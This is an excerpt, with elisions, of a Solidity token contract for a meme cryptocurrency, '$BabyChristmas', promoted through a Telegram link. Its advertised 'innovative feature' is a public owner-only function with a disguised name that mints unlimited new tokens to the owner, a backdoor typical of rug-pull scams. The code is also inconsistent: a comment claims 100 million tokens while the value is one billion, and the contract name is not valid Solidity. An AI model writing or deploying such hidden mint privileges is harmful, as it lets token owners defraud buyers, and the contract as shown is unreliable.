...
//
// $BabyChristmas proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/BabyChristmasBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Babychristmas(uint256 amount) public onlyOwner {
 _Babychristmas(msg.sender, amount);
    }
    ...
    function _Babychristmas(address account, uint256 amount) internal virtual {
...
contract $BabyChristmas is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Christmas", "BABYCHRISTMAS") {
        _Babychristmas(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}